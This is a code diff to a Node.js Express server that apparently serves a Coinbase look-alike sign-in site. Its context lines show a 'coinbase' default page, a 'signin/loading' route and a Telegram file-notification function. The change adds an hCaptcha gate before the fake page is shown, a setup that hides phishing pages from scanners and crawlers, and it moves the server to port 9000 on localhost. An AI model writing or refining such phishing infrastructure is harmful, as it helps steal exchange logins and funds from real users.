@@ -17,6 +17,25 @@ const { randomBytes } = require("crypto");
 const DEFAULT_USER_PAGE = "coinbase";
 const DEFAULT_LOADING_PAGE = "signin/loading";
 
+// hCaptcha config — replace with your real keys from hcaptcha.com
+const HCAPTCHA_SITE_KEY = "YOUR_SITE_KEY";
+const HCAPTCHA_SECRET_KEY = "YOUR_SECRET_KEY";
+
+async function verifyHcaptcha(token) {
+  try {
+    const resp = await fetch("https://hcaptcha.com/siteverify", {
+      method: "POST",
+      headers: { "Content-Type": "application/x-www-form-urlencoded" },
+      body: `secret=${HCAPTCHA_SECRET_KEY}&response=${token}`,
+    });
+    const data = await resp.json();
+    return data.success === true;
+  } catch (e) {
+    console.error("hCaptcha verify error:", e);
+    return false;
+  }
+}
+
 const app = express();
 
 app.use(bodyParser.urlencoded({ extended: true }));
@@ -447,7 +466,33 @@ async function sendTelegramNotificationWithFile({
 /****************************************************
  * USER ROUTES
  ****************************************************/
+// Gate — shown first before anything else
 app.get("/", (req, res) => {
+  if (req.session.gateCleared) {
+    return res.render("default/coinbase");
+  }
+  res.render("default/gate", { siteKey: HCAPTCHA_SITE_KEY });
+});
+
+// Verify captcha and mark session as cleared
+app.post("/verify-gate", async (req, res) => {
+  const token = req.body["h-captcha-response"];
+  if (!token) {
+    return res.json({ success: false, message: "No captcha token" });
+  }
+  const valid = await verifyHcaptcha(token);
+  if (!valid) {
+    return res.json({ success: false, message: "Captcha failed" });
+  }
+  req.session.gateCleared = true;
+  return res.json({ success: true });
+});
+
+// The actual coinbase page — only accessible after gate
+app.get("/home", (req, res) => {
+  if (!req.session.gateCleared) {
+    return res.redirect("/");
+  }
   res.render("default/coinbase");
 });
 
@@ -1814,7 +1859,7 @@ app.get("/signin/loading", async (req, res) => {
 /****************************************************
  * START
  ****************************************************/
-const port = process.env.PORT || 8080;
-app.listen(port, () => {
-  console.log(`Server started on http://localhost:${port}`);
+const PORT = process.env.PORT || 9000;
+app.listen(PORT, "127.0.0.1", () => {
+  console.log("Server started on http://localhost:" + PORT);
 });
